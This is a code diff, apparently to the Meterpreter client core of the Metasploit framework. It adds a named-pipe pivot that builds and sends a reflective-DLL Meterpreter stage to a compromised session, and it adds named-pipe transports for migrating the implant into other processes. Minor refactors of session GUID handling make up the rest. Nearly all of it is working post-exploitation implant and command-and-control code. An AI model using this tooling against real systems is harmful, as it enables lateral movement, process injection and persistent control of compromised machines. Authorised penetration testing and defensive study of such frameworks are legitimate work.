@@ -3,6 +3,7 @@
 require 'rex/post/meterpreter/packet'
 require 'rex/post/meterpreter/extension'
 require 'rex/post/meterpreter/client'
+require 'msf/core/payload/transport_config'
 
 # Used to generate a reflective DLL when migrating. This is yet another
 # argument for moving the meterpreter client into the Msf namespace.
@@ -66,6 +67,44 @@ class ClientCore < Extension
   # Core commands
   #
   ##
+
+  #
+  # create a named pipe pivot
+  #
+  def create_named_pipe_pivot(opts)
+    request = Packet.create_request('core_pivot_add')
+    request.add_tlv(TLV_TYPE_PIVOT_NAMED_PIPE_NAME, opts[:pipe_name])
+
+
+    c = Class.new(::Msf::Payload)
+    c.include(::Msf::Payload::Stager)
+    c.include(::Msf::Payload::TransportConfig)
+
+    # Include the appropriate reflective dll injection module for the target process architecture...
+    if opts[:arch] == ARCH_X86
+      c.include(::Msf::Payload::Windows::MeterpreterLoader)
+    elsif opts[:arch] == ARCH_X64
+      c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
+    end
+
+    stage_opts = {
+      force_write_handle: true,
+      datastore: {
+        'PIPEHOST' => opts[:pipe_host],
+        'PIPENAME' => opts[:pipe_name]
+      }
+    }
+
+    stager = c.new()
+
+    stage_opts[:transport_config] = [stager.transport_config_reverse_named_pipe(stage_opts)]
+    stage = stager.stage_payload(stage_opts)
+
+    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA, stage)
+    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA_SIZE, stage.length)
+
+    response = self.client.send_request(request)
+  end
 
   #
   # Get a list of loaded commands for the given extension.
@@ -320,7 +359,7 @@ class ClientCore < Extension
   #
   def set_session_guid(guid)
     request = Packet.create_request('core_set_session_guid')
-    request.add_tlv(TLV_TYPE_SESSION_GUID, [guid.gsub(/-/, '')].pack('H*'))
+    request.add_tlv(TLV_TYPE_SESSION_GUID, guid)
 
     client.send_request(request)
 
@@ -338,10 +377,7 @@ class ClientCore < Extension
 
     response = client.send_request(*args)
 
-    bytes = response.get_tlv_value(TLV_TYPE_SESSION_GUID)
-
-    parts = bytes.unpack('H*')[0]
-    [parts[0, 8], parts[8, 4], parts[12, 4], parts[16, 4], parts[20, 12]].join('-')
+    response.get_tlv_value(TLV_TYPE_SESSION_GUID)
   end
 
   #
@@ -581,11 +617,11 @@ class ClientCore < Extension
       request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
     end
 
-    request.add_tlv( TLV_TYPE_MIGRATE_PID, target_pid )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
-    request.add_tlv( TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
+    request.add_tlv(TLV_TYPE_MIGRATE_PID, target_pid)
+    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length)
+    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
+    request.add_tlv(TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length)
+    request.add_tlv(TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
 
     if target_process['arch'] == ARCH_X64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
@@ -614,7 +650,7 @@ class ClientCore < Extension
       # Sleep for 5 seconds to allow the full handoff, this prevents
       # the original process from stealing our loadlib requests
       ::IO.select(nil, nil, nil, 5.0)
-    else
+    elsif client.pivot_session.nil?
       # Prevent new commands from being sent while we finish migrating
       client.comm_mutex.synchronize do
         # Disable the socket request monitor
@@ -751,6 +787,8 @@ private
         case t[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp)
+        when /^pipe/i
+          c.include(::Msf::Payload::Windows::MigrateNamedPipe)
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp)
@@ -760,6 +798,8 @@ private
         case t[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp_x64)
+        when /^pipe/i
+          c.include(::Msf::Payload::Windows::MigrateNamedPipe_x64)
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp_x64)
